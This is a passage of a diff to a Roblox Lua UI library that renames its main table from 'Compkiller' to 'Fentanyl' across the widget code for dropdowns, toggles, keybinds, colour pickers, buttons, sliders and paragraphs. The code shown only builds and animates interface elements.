 			BlockText.TextSize = 13.000
 			BlockText.TextTransparency = 0.500
 			BlockText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = BlockText,
 				Property = 'TextColor3'
 			});
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = DropdownItem
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -3309,7 +3309,7 @@
 			BlockLine.Size = UDim2.new(1, -6, 0, 1)
 			BlockLine.ZIndex = BaseZ_Index + 7
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			});
@@ -3359,26 +3359,26 @@
 
 				table.insert(__signals , ToggleDb:Connect(function(bool)
 					if bool then
-						Compkiller:_Animation(bth.BlockText,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(bth.BlockText,TweenInfo.new(0.2),{
 							TextTransparency = ((IsDefault(v) or MatchDefault(v,DataFrame)) and 0) or 0.5
 						});
 
-						Compkiller:_Animation(bth.BlockLine,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(bth.BlockLine,TweenInfo.new(0.2),{
 							BackgroundTransparency = 0
 						});
 					else
-						Compkiller:_Animation(bth.BlockText,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(bth.BlockText,TweenInfo.new(0.2),{
 							TextTransparency = 1
 						});
 
-						Compkiller:_Animation(bth.BlockLine,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(bth.BlockLine,TweenInfo.new(0.2),{
 							BackgroundTransparency = 1
 						});
 					end;
 				end));
 
 				if ToggleDb:GetValue() then
-					Compkiller:_Animation(bth.BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(bth.BlockText,TweenInfo.new(0.2),{
 						TextTransparency = ((IsDefault(v) or MatchDefault(v,DataFrame)) and 0) or 0.5
 					});
 				end;
@@ -3394,23 +3394,23 @@
 						DataFrame[v] = false;
 					end;
 
-					Compkiller:_Animation(bth.BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(bth.BlockText,TweenInfo.new(0.2),{
 						TextTransparency = ((MatchDefault(v,DataFrame)) and 0) or 0.5
 					});
 
-					Compkiller:_Input(bth.DropdownItem,function()
+					Fentanyl:_Input(bth.DropdownItem,function()
 						DataFrame[v] = not DataFrame[v];
 
-						Compkiller:_Animation(bth.BlockText,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(bth.BlockText,TweenInfo.new(0.2),{
 							TextTransparency = ((MatchDefault(v,DataFrame)) and 0) or 0.5
 						});
 
 						Callback(DataFrame)
 					end);
 				else
-					Compkiller:_Input(bth.DropdownItem,function()
+					Fentanyl:_Input(bth.DropdownItem,function()
 						if DataFrame then
-							Compkiller:_Animation(DataFrame.BlockText,TweenInfo.new(0.2),{
+							Fentanyl:_Animation(DataFrame.BlockText,TweenInfo.new(0.2),{
 								TextTransparency = ((IsDefault(v) or MatchDefault(v,DataFrame)) and 0) or 0.5
 							});
 						end;
@@ -3419,7 +3419,7 @@
 
 						DataFrame = bth;
 
-						Compkiller:_Animation(bth.BlockText,TweenInfo.new(0.2),{
+						Fentanyl:_Animation(bth.BlockText,TweenInfo.new(0.2),{
 							TextTransparency = ((IsDefault(v) or MatchDefault(v,DataFrame)) and 0) or 0.5
 						});
 
@@ -3444,7 +3444,7 @@
 
 		UserInputService.InputBegan:Connect(function(Input)
 			if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
-				if not Compkiller:_IsMouseOverFrame(DropdownWindow) then
+				if not Fentanyl:_IsMouseOverFrame(DropdownWindow) then
 					ToggleUI(false);
 				end;
 			end;
@@ -3484,14 +3484,14 @@
 		return Args;
 	end;
 
-	function Compkiller:_LoadElement(Parent: Frame , EnabledLine: boolean , Signal)
+	function Fentanyl:_LoadElement(Parent: Frame , EnabledLine: boolean , Signal)
 		local Zindex = Parent.ZIndex + 1;
 		local Tween = TweenInfo.new(0.25,Enum.EasingStyle.Quint);
 
 		local Args = {};
 
 		function Args:AddToggle(Config : Toggle)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Name = "Toggle",
 				Default = false,
 				Flag = nil,
@@ -3499,14 +3499,14 @@
 				Callback = function() end;
 			});
 
-			local Block = Compkiller:_CreateBlock(Signal);
+			local Block = Fentanyl:_CreateBlock(Signal);
 
 			Block:SetParent(Parent);
 
 			Block:SetText(Config.Name);
 
 			if Config.Risky then
-				Block:SetTextColor(Compkiller.Colors.Risky);
+				Block:SetTextColor(Fentanyl.Colors.Risky);
 			end;
 
 			Block:SetLine(EnabledLine);
@@ -3544,21 +3544,21 @@
 
 			end);
 
-			Args.Link = Compkiller:_LoadOption(Block);
+			Args.Link = Fentanyl:_LoadOption(Block);
 
 			function Args:GetValue()
 				return Config.Default;
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddKeybind(Config : Keybind)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Name = "Keybind",
 				Default = nil,
 				Flag = nil,
@@ -3566,7 +3566,7 @@
 				Blacklist = {}
 			});
 
-			local Block = Compkiller:_CreateBlock(Signal);
+			local Block = Fentanyl:_CreateBlock(Signal);
 
 			Block:SetParent(Parent);
 
@@ -3584,7 +3584,7 @@
 				return Config.Blacklist and (Config.Blacklist[v] or table.find(Config.Blacklist,v))
 			end;
 
-			Compkiller:_Input(Keybind.Root,function()
+			Fentanyl:_Input(Keybind.Root,function()
 				if IsBinding then
 					return;
 				end;
@@ -3634,21 +3634,21 @@
 				Block:SetVisible(bool);
 			end);
 
-			Args.Link = Compkiller:_LoadOption(Block);
+			Args.Link = Fentanyl:_LoadOption(Block);
 
 			function Args:GetValue()
 				return (typeof(Config.Default) == "string" and Config.Default) or Config.Default.Name;
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddColorPicker(Config: ColorPicker)
-			Config = Compkiller.__CONFIG(Config,{
+			Config = Fentanyl.__CONFIG(Config,{
 				Name = "ColorPicker",
 				Default = Color3.fromRGB(255,255,255),
 				Flag = nil,
@@ -3656,7 +3656,7 @@
 				Callback = function() end;
 			});
 
-			local Block = Compkiller:_CreateBlock(Signal);
+			local Block = Fentanyl:_CreateBlock(Signal);
 
 			Block:SetParent(Parent);
 
@@ -3668,9 +3668,9 @@
 
 			local ColorPicker:Frame , ColorFrame: Frame = Block:AddLink('ColorPicker' , Config.Default);
 
-			local Button = Compkiller:_Input(ColorPicker);
+			local Button = Fentanyl:_Input(ColorPicker);
 
-			local ColorPicker = Compkiller:_AddColorPickerPanel(Button,function(color,opc)
+			local ColorPicker = Fentanyl:_AddColorPickerPanel(Button,function(color,opc)
 				Config.Default = color;
 				Config.Transparency = opc;
 
@@ -3701,7 +3701,7 @@
 				Block:SetVisible(bool);
 			end);
 
-			Args.Link = Compkiller:_LoadOption(Block);
+			Args.Link = Fentanyl:_LoadOption(Block);
 
 			function Args:GetValue()
 				return {
@@ -3713,14 +3713,14 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddButton(Config: Button)
-			Config = Compkiller.__CONFIG(Config , {
+			Config = Fentanyl.__CONFIG(Config , {
 				Name = 'Button',
 				Callback = function() end
 			});
@@ -3732,11 +3732,11 @@
 			local UICorner = Instance.new("UICorner")
 			local TextLabel = Instance.new("TextLabel")
 
-			if Compkiller:_IsMobile() then
-				Compkiller:_AddDragBlacklist(Button);
+			if Fentanyl:_IsMobile() then
+				Fentanyl:_AddDragBlacklist(Button);
 			end;
 
-			Button.Name = Compkiller:_RandomString()
+			Button.Name = Fentanyl:_RandomString()
 			Button.Parent = Parent
 			Button.BackgroundTransparency = 1.000
 			Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -3744,10 +3744,10 @@
 			Button.Size = UDim2.new(1, -1, 0, 30)
 			Button.ZIndex = Zindex + 5
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = Button
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -3755,14 +3755,14 @@
 			BlockLine.Size = UDim2.new(1, -26, 0, 1)
 			BlockLine.ZIndex = Zindex + 6
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			});
 
 			Frame.Parent = Button
 			Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-			Frame.BackgroundColor3 = Compkiller.Colors.Highlight
+			Frame.BackgroundColor3 = Fentanyl.Colors.Highlight
 			Frame.BackgroundTransparency = 0.100
 			Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Frame.BorderSizePixel = 0
@@ -3770,15 +3770,15 @@
 			Frame.Size = UDim2.new(1, -15, 1, -5)
 			Frame.ZIndex = Zindex + 7;
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = Frame,
 				Property = "BackgroundColor3"
 			});
 
-			UIStroke.Color = Compkiller.Colors.StrokeColor
+			UIStroke.Color = Fentanyl.Colors.StrokeColor
 			UIStroke.Parent = Frame
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			});
@@ -3796,30 +3796,30 @@
 			TextLabel.ZIndex = Zindex + 8
 			TextLabel.Font = Enum.Font.GothamMedium
 			TextLabel.Text = Config.Name;
-			TextLabel.TextColor3 = Compkiller.Colors.SwitchColor
+			TextLabel.TextColor3 = Fentanyl.Colors.SwitchColor
 			TextLabel.TextSize = 12.000
 			TextLabel.TextStrokeTransparency = 0.900
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = TextLabel,
 				Property = 'TextColor3'
 			});
 
-			Compkiller:_Hover(Frame,function()
+			Fentanyl:_Hover(Frame,function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(Frame,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(Frame,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0
 					})
 				end;
 			end,function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(Frame,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(Frame,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0.1
 					})
 				end;
 			end);
 
-			Compkiller:_Input(Frame,function()
+			Fentanyl:_Input(Frame,function()
 				Config.Callback();
 			end);
 
@@ -3827,37 +3827,37 @@
 
 			Args.Signal = Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(BlockLine, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(BlockLine, TweenInfo.new(0.35),{
 						BackgroundTransparency = 0.500
 					});
 
-					Compkiller:_Animation(Frame, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(Frame, TweenInfo.new(0.35),{
 						BackgroundTransparency = 0.1
 					});
 
-					Compkiller:_Animation(UIStroke, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(UIStroke, TweenInfo.new(0.35),{
 						Transparency = 0
 					});
 
-					Compkiller:_Animation(TextLabel, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(TextLabel, TweenInfo.new(0.35),{
 						TextStrokeTransparency = 0.900,
 						TextTransparency = 0
 					});
 
 				else
-					Compkiller:_Animation(BlockLine, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(BlockLine, TweenInfo.new(0.35),{
 						BackgroundTransparency = 1
 					});
 
-					Compkiller:_Animation(Frame, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(Frame, TweenInfo.new(0.35),{
 						BackgroundTransparency = 1
 					});
 
-					Compkiller:_Animation(UIStroke, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(UIStroke, TweenInfo.new(0.35),{
 						Transparency = 1
 					});
 
-					Compkiller:_Animation(TextLabel, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(TextLabel, TweenInfo.new(0.35),{
 						TextStrokeTransparency = 1,
 						TextTransparency = 1
 					});
@@ -3873,7 +3873,7 @@
 		end;
 
 		function Args:AddSlider(Config: Slider)
-			Config = Compkiller.__CONFIG(Config , {
+			Config = Fentanyl.__CONFIG(Config , {
 				Name = 'Slider',
 				Default = 50,
 				Min = 0,
@@ -3896,9 +3896,9 @@
 			local UIScale = Instance.new("UIScale")
 			local ValueText = Instance.new("TextLabel")
 
-			Compkiller:_AddDragBlacklist(Slider);
+			Fentanyl:_AddDragBlacklist(Slider);
 
-			Slider.Name = Compkiller:_RandomString()
+			Slider.Name = Fentanyl:_RandomString()
 			Slider.Parent = Parent
 			Slider.BackgroundTransparency = 1.000
 			Slider.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -3906,7 +3906,7 @@
 			Slider.Size = UDim2.new(1, -1, 0, 45)
 			Slider.ZIndex = Zindex + 1
 
-			BlockText.Name = Compkiller:_RandomString()
+			BlockText.Name = Fentanyl:_RandomString()
 			BlockText.Parent = Slider
 			BlockText.BackgroundTransparency = 1.000
 			BlockText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -3916,20 +3916,20 @@
 			BlockText.ZIndex = Zindex + 2
 			BlockText.Font = Enum.Font.GothamMedium
 			BlockText.Text = Config.Name
-			BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+			BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
 			BlockText.TextSize = 14.000
 			BlockText.TextTransparency = 0.100
 			BlockText.TextXAlignment = Enum.TextXAlignment.Left
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = BlockText,
 				Property = 'TextColor3'
 			});
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = Slider
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -3938,15 +3938,15 @@
 			BlockLine.ZIndex = Zindex + 2
 			BlockLine.Visible = EnabledLine or false;
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			});
 
-			SliderBar.Name = Compkiller:_RandomString()
+			SliderBar.Name = Fentanyl:_RandomString()
 			SliderBar.Parent = Slider
 			SliderBar.AnchorPoint = Vector2.new(0.5, 1)
-			SliderBar.BackgroundColor3 = Compkiller.Colors.DropColor
+			SliderBar.BackgroundColor3 = Fentanyl.Colors.DropColor
 			SliderBar.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			SliderBar.BorderSizePixel = 0
 			SliderBar.ClipsDescendants = true
@@ -3954,15 +3954,15 @@
 			SliderBar.Size = UDim2.new(1, -25, 0, 10)
 			SliderBar.ZIndex = Zindex + 3
 
-			table.insert(Compkiller.Elements.DropColor , {
+			table.insert(Fentanyl.Elements.DropColor , {
 				Element = SliderBar,
 				Property = "BackgroundColor3"
 			})
 
-			UIStroke.Color = Compkiller.Colors.StrokeColor
+			UIStroke.Color = Fentanyl.Colors.StrokeColor
 			UIStroke.Parent = SliderBar
 
-			table.insert(Compkiller.Elements.StrokeColor,{
+			table.insert(Fentanyl.Elements.StrokeColor,{
 				Element = UIStroke,
 				Property = "Color"
 			});
@@ -3970,17 +3970,17 @@
 			UICorner.CornerRadius = UDim.new(0, 6)
 			UICorner.Parent = SliderBar
 
-			SliderInput.Name = Compkiller:_RandomString()
+			SliderInput.Name = Fentanyl:_RandomString()
 			SliderInput.Parent = SliderBar
 			SliderInput.AnchorPoint = Vector2.new(0, 0.5)
-			SliderInput.BackgroundColor3 = Compkiller.Colors.Highlight
+			SliderInput.BackgroundColor3 = Fentanyl.Colors.Highlight
 			SliderInput.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			SliderInput.BorderSizePixel = 0
 			SliderInput.Position = UDim2.new(0, 0, 0.5, 0)
 			SliderInput.Size = UDim2.new(math.max((Config.Default - Config.Min) / (Config.Max - Config.Min) , 0.045), 0, 1, 0)
 			SliderInput.ZIndex = Zindex + 4
 
-			table.insert(Compkiller.Elements.Highlight,{
+			table.insert(Fentanyl.Elements.Highlight,{
 				Element = SliderInput,
 				Property = "BackgroundColor3"
 			});
@@ -3990,7 +3990,7 @@
 
 			Frame.Parent = SliderInput
 			Frame.AnchorPoint = Vector2.new(1, 0.5)
-			Frame.BackgroundColor3 = Compkiller.Colors.SwitchColor
+			Frame.BackgroundColor3 = Fentanyl.Colors.SwitchColor
 			Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			Frame.BorderSizePixel = 0
 			Frame.Position = UDim2.new(1, 5, 0.5, 0)
@@ -3999,7 +3999,7 @@
 			Frame.SizeConstraint = Enum.SizeConstraint.RelativeYY
 			Frame.ZIndex = Zindex + 6
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = Frame,
 				Property = 'BackgroundColor3'
 			});
@@ -4010,7 +4010,7 @@
 			UIScale.Parent = Frame
 			UIScale.Scale = 1.300
 
-			ValueText.Name = Compkiller:_RandomString()
+			ValueText.Name = Fentanyl:_RandomString()
 			ValueText.Parent = Slider
 			ValueText.BackgroundTransparency = 1.000
 			ValueText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -4020,25 +4020,25 @@
 			ValueText.ZIndex = Zindex + 4
 			ValueText.Font = Enum.Font.GothamMedium
 			ValueText.Text = tostring(Config.Default)..tostring(Config.Type)
-			ValueText.TextColor3 = Compkiller.Colors.SwitchColor
+			ValueText.TextColor3 = Fentanyl.Colors.SwitchColor
 			ValueText.TextSize = 12.000
 			ValueText.TextTransparency = 0.750
 			ValueText.TextXAlignment = Enum.TextXAlignment.Right
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = ValueText,
 				Property = 'TextColor3'
 			});
 
-			Compkiller:_Hover(SliderBar,function()
+			Fentanyl:_Hover(SliderBar,function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(ValueText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ValueText,TweenInfo.new(0.2),{
 						TextTransparency = 0.2
 					})
 				end;
 			end,function()
 				if Signal:GetValue() then
-					Compkiller:_Animation(ValueText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(ValueText,TweenInfo.new(0.2),{
 						TextTransparency = 0.750
 					})
 				end;
@@ -4051,7 +4051,7 @@
 
 				local Main = ((Config.Max - Config.Min) * SizeScale) + Config.Min;
 
-				local Value = Compkiller:_Rounding(Main,Config.Round);
+				local Value = Fentanyl:_Rounding(Main,Config.Round);
 
 				local PositionX = UDim2.fromScale(SizeScale, 1);
 
@@ -4079,7 +4079,7 @@
 				SliderBar.InputEnded:Connect(function(Input)
 					if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
 						if UserInputService.TouchEnabled then
-							if not Compkiller:_IsMouseOverFrame(SliderBar) then
+							if not Fentanyl:_IsMouseOverFrame(SliderBar) then
 								IsHold = false
 							end;
 						else
@@ -4092,7 +4092,7 @@
 					if IsHold then
 						if (Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch)  then
 							if UserInputService.TouchEnabled then
-								if not Compkiller:_IsMouseOverFrame(SliderBar) then
+								if not Fentanyl:_IsMouseOverFrame(SliderBar) then
 									IsHold = false
 								else
 									Update(Input)
@@ -4114,7 +4114,7 @@
 
 				ValueText.Text = tostring(Config.Default)..tostring(Config.Type)
 
-				Compkiller:_Animation(SliderInput, TweenInfo.new(0.35),{
+				Fentanyl:_Animation(SliderInput, TweenInfo.new(0.35),{
 					Size = UDim2.new(math.max((Config.Default - Config.Min) / (Config.Max - Config.Min) , 0.045), 0, 1, 0)
 				});
 
@@ -4123,67 +4123,67 @@
 
 			Args.Signal = Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(SliderInput, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(SliderInput, TweenInfo.new(0.35),{
 						Size = UDim2.new(math.max((Config.Default - Config.Min) / (Config.Max - Config.Min) , 0.045), 0, 1, 0)
 					});
 
-					Compkiller:_Animation(ValueText,Tween,{
+					Fentanyl:_Animation(ValueText,Tween,{
 						TextTransparency = 0.750
 					})
 
-					Compkiller:_Animation(Frame,Tween,{
+					Fentanyl:_Animation(Frame,Tween,{
 						BackgroundTransparency = 0
 					})
 
-					Compkiller:_Animation(SliderInput,Tween,{
+					Fentanyl:_Animation(SliderInput,Tween,{
 						BackgroundTransparency = 0
 					})
 
-					Compkiller:_Animation(UIStroke,Tween,{
+					Fentanyl:_Animation(UIStroke,Tween,{
 						Transparency = 0
 					})
 
-					Compkiller:_Animation(SliderBar,Tween,{
+					Fentanyl:_Animation(SliderBar,Tween,{
 						BackgroundTransparency = 0
 					})
 
-					Compkiller:_Animation(BlockLine,Tween,{
+					Fentanyl:_Animation(BlockLine,Tween,{
 						BackgroundTransparency = 0.5
 					})
 
-					Compkiller:_Animation(BlockText,Tween,{
+					Fentanyl:_Animation(BlockText,Tween,{
 						TextTransparency = 0.1
 					})
 				else
-					Compkiller:_Animation(SliderInput, TweenInfo.new(0.35),{
+					Fentanyl:_Animation(SliderInput, TweenInfo.new(0.35),{
 						Size = UDim2.new(0, 0, 1, 0)
 					});
 
-					Compkiller:_Animation(ValueText,Tween,{
+					Fentanyl:_Animation(ValueText,Tween,{
 						TextTransparency = 1
 					})
 
-					Compkiller:_Animation(Frame,Tween,{
+					Fentanyl:_Animation(Frame,Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(SliderInput,Tween,{
+					Fentanyl:_Animation(SliderInput,Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(UIStroke,Tween,{
+					Fentanyl:_Animation(UIStroke,Tween,{
 						Transparency = 1
 					})
 
-					Compkiller:_Animation(SliderBar,Tween,{
+					Fentanyl:_Animation(SliderBar,Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(BlockLine,Tween,{
+					Fentanyl:_Animation(BlockLine,Tween,{
 						BackgroundTransparency = 1
 					})
 
-					Compkiller:_Animation(BlockText,Tween,{
+					Fentanyl:_Animation(BlockText,Tween,{
 						TextTransparency = 1
 					})
 				end;
@@ -4194,14 +4194,14 @@
 			end;
 
 			if Config.Flag then
-				Compkiller.Flags[Config.Flag] = Args;
+				Fentanyl.Flags[Config.Flag] = Args;
 			end;
 
 			return Args;
 		end;
 
 		function Args:AddParagraph(Config: Paragraph) -- request by Neptune
-			Config = Compkiller.__CONFIG(Config, {
+			Config = Fentanyl.__CONFIG(Config, {
 				Title = "Paragraph",
 				Content = ""
 			});
@@ -4211,11 +4211,11 @@
 			local BlockLine = Instance.new("Frame")
 			local DescriptionText = Instance.new("TextLabel")
 
-			if Compkiller:_IsMobile() then
-				Compkiller:_AddDragBlacklist(Paragraph);
+			if Fentanyl:_IsMobile() then
+				Fentanyl:_AddDragBlacklist(Paragraph);
 			end;
 
-			Paragraph.Name = Compkiller:_RandomString()
+			Paragraph.Name = Fentanyl:_RandomString()
 			Paragraph.Parent = Parent
 			Paragraph.BackgroundTransparency = 1.000
 			Paragraph.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -4224,7 +4224,7 @@
 			Paragraph.ZIndex = Zindex + 2
 			Paragraph.ClipsDescendants = true
 
-			BlockText.Name = Compkiller:_RandomString()
+			BlockText.Name = Fentanyl:_RandomString()
 			BlockText.Parent = Paragraph
 			BlockText.AnchorPoint = Vector2.new(0, 0.5)
 			BlockText.BackgroundTransparency = 1.000
@@ -4235,21 +4235,21 @@
 			BlockText.ZIndex = Zindex + 3
 			BlockText.Font = Enum.Font.GothamMedium
 			BlockText.Text = Config.Title
-			BlockText.TextColor3 = Compkiller.Colors.SwitchColor
+			BlockText.TextColor3 = Fentanyl.Colors.SwitchColor
 			BlockText.TextSize = 14.000
 			BlockText.TextTransparency = 0.300
 			BlockText.TextXAlignment = Enum.TextXAlignment.Left
 			BlockText.RichText = true
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = BlockText,
 				Property = 'TextColor3'
 			});
 
-			BlockLine.Name = Compkiller:_RandomString()
+			BlockLine.Name = Fentanyl:_RandomString()
 			BlockLine.Parent = Paragraph
 			BlockLine.AnchorPoint = Vector2.new(0.5, 1)
-			BlockLine.BackgroundColor3 = Compkiller.Colors.LineColor
+			BlockLine.BackgroundColor3 = Fentanyl.Colors.LineColor
 			BlockLine.BackgroundTransparency = 0.500
 			BlockLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
 			BlockLine.BorderSizePixel = 0
@@ -4257,13 +4257,13 @@
 			BlockLine.Size = UDim2.new(1, -26, 0, 1)
 			BlockLine.ZIndex = Zindex + 4
 
-			table.insert(Compkiller.Elements.LineColor,{
+			table.insert(Fentanyl.Elements.LineColor,{
 				Element = BlockLine,
 				Property = "BackgroundColor3"
 			});
 
 			DescriptionText.RichText = true
-			DescriptionText.Name = Compkiller:_RandomString()
+			DescriptionText.Name = Fentanyl:_RandomString()
 			DescriptionText.Parent = Paragraph
 			DescriptionText.BackgroundTransparency = 1.000
 			DescriptionText.BorderColor3 = Color3.fromRGB(0, 0, 0)
@@ -4273,13 +4273,13 @@
 			DescriptionText.ZIndex = Zindex + 5
 			DescriptionText.Font = Enum.Font.GothamMedium
 			DescriptionText.Text = Config.Content
-			DescriptionText.TextColor3 = Compkiller.Colors.SwitchColor
+			DescriptionText.TextColor3 = Fentanyl.Colors.SwitchColor
 			DescriptionText.TextSize = 13.000
 			DescriptionText.TextTransparency = 0.500
 			DescriptionText.TextXAlignment = Enum.TextXAlignment.Left
 			DescriptionText.TextYAlignment = Enum.TextYAlignment.Top
 
-			table.insert(Compkiller.Elements.SwitchColor , {
+			table.insert(Fentanyl.Elements.SwitchColor , {
 				Element = DescriptionText,
 				Property = 'TextColor3'
 			});
@@ -4291,14 +4291,14 @@
 				if not DescriptionText.Text:byte() then
 					local TitleScale = TextService:GetTextSize(BlockText.Text,BlockText.TextSize,BlockText.Font,Vector2.new(math.huge,math.huge));
 
-					Compkiller:_Animation(Paragraph,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(Paragraph,TweenInfo.new(0.15),{
 						Size = UDim2.new(1, -1, 0, TitleScale.Y + Base)
 					});
 				else
 					local TitleScale = TextService:GetTextSize(BlockText.Text,BlockText.TextSize,BlockText.Font,Vector2.new(math.huge,math.huge));
 					local ContentScale = TextService:GetTextSize(DescriptionText.Text,DescriptionText.TextSize,DescriptionText.Font,Vector2.new(math.huge,math.huge));
 
-					Compkiller:_Animation(Paragraph,TweenInfo.new(0.15),{
+					Fentanyl:_Animation(Paragraph,TweenInfo.new(0.15),{
 						Size = UDim2.new(1, -1, 0, (TitleScale.Y + ContentScale.Y) + Base)
 					});
 				end;
@@ -4320,27 +4320,27 @@
 
 			Args.Signal = Signal:Connect(function(bool)
 				if bool then
-					Compkiller:_Animation(BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockText,TweenInfo.new(0.2),{
 						TextTransparency = 0.300
 					});
 
-					Compkiller:_Animation(DescriptionText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(DescriptionText,TweenInfo.new(0.2),{
 						TextTransparency = 0.500
 					});
 
-					Compkiller:_Animation(BlockLine,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockLine,TweenInfo.new(0.2),{
 						BackgroundTransparency = 0.500
 					});
 				else
-					Compkiller:_Animation(BlockText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockText,TweenInfo.new(0.2),{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(DescriptionText,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(DescriptionText,TweenInfo.new(0.2),{
 						TextTransparency = 1
 					});
 
-					Compkiller:_Animation(BlockLine,TweenInfo.new(0.2),{
+					Fentanyl:_Animation(BlockLine,TweenInfo.new(0.2),{
 						BackgroundTransparency = 1
 					});
 				end;
@@ -4350,7 +4350,7 @@
 		end;
 
 		function Args:AddTextBox(Config: TextBoxConfig)
